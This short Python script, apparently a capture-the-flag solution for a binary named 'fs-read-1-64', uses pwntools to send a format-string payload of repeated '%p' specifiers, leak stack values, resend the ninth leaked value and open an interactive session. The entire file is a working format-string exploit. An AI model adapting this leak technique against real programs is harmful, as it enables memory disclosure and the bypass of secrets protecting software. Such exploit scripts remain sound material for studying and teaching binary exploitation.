#!/usr/bin/env python

from pwn import *
import os

p = process('./fs-read-1-64')
print(p.recvline())
p.sendline(' %p %p %p %p %p %p %p %p %p')
data=p.recvline()
print(data)
tosend=data.split(' ')[8]
tosendd=tosend[0:10]
print('test:')
print(tosendd)
p.sendline(tosendd)
p.recvline()
p.interactive()

